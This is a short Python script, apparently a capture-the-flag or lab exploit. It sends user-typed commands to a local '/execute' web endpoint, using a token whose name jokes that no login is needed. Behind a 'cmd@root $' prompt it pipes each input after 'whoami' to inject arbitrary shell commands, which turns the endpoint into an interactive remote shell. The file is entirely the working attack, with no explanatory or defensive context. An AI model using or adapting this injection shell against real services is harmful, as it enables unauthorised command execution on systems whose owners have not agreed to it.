import requests
import json

class APIClient:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.auth_token = auth_token

    def _get_headers(self):
        headers = {
            "Content-Type": "application/json",
        }
        if self.auth_token:
            headers["Authorization"] = self.auth_token
        return headers

    def execute_command(self, command):
        url = f"{self.base_url}/execute"
        headers = self._get_headers()
        data = {
            "command": command
        }
        response = requests.post(url, headers=headers, data=json.dumps(data))
        return response

# Penggunaan Kelas APIClient
if __name__ == "__main__":
    base_url = "http://localhost:16001"
    auth_token = "ga_harus_login_sih:D"

    while True:
        x = input("cmd@root $ ")
        command = f"\\whoami | {x}"
        client = APIClient(base_url, auth_token)
        response = client.execute_command(command)

        print("Status Code:", response.status_code)
        print("Response JSON:", response.json())
